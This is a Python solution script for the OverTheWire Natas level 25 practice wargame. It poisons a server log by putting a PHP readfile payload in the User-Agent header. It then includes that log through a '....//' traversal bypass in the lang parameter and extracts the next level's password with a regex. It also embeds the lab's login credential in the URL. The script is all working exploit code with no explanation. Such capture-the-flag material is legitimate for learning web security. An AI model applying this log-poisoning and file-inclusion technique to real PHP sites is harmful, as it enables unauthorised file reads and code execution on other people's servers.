import requests
import re

def directory_traversal(url):
    session = requests.Session()
    session.headers.update({'User-Agent': '<? readfile("/etc/natas_webpass/natas26") ?>'})
    cookie = session.get(url).cookies.get_dict()
    for i in range(5):
        traverse = "....//" * i + f"logs/natas25_{cookie['PHPSESSID']}.log"
        r = requests.get(f"{url}?lang={traverse}")
        print(r.text)


def natas25(url):
    session = requests.Session()
    session.headers.update({'User-Agent': '<? readfile("/etc/natas_webpass/natas26") ?>'})    
    cookie = session.get(url).cookies.get_dict()
    payload = f"....//logs/natas25_{cookie['PHPSESSID']}.log"    
    response = session.get(f"{url}?lang={payload}", cookies=cookie)
    print(re.findall(r"] (.{32})", response.text)[0])

if __name__ == '__main__':
    url = 'http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org'
    directory_traversal(url)

    natas25(url)
